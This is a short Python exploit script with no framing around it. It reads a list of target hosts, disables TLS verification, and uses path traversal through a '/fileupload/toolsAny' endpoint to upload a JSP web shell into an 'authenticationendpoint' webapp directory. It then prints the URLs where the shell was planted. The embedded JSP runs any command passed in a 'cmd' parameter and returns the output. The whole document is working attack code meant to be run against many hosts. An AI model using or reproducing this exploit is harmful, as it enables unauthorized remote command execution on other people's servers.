
import requests, urllib3, sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)    
shell = """<FORM>
    			<INPUT name='cmd' type=text>
    			<INPUT type=submit value='Run'>
			</FORM>
			<%@ page import="java.io.*" %>
    			<%
    			String cmd = request.getParameter("cmd");
    			String output = "";
    			if(cmd != null) {
        			String s = null;
        			try {
            			Process p = Runtime.getRuntime().exec(cmd,null,null);
            			BufferedReader sI = new BufferedReader(new
			InputStreamReader(p.getInputStream()));
            			while((s = sI.readLine()) != null) { output += s+"</br>"; }
        			}  catch(IOException e) {   e.printStackTrace();   }
    			}
			%>
        		<pre><%=output %></pre>"""

def req(url):
    
    try:
        return requests.get(url)
    except requests.exceptions.ConnectionError:
            pass



with open("target.txt","r") as wordlist_files:
	for line in wordlist_files:
		word = line.strip() 
		proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
		files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/shell.jsp": shell}
		try:
			response = requests.post(f'{word}/fileupload/toolsAny', files=files, verify=False)
		except:
			pass
		
		
		if response:
			print(f"{word}/authenticationendpoint/shell.jsp",response)

		
	
	
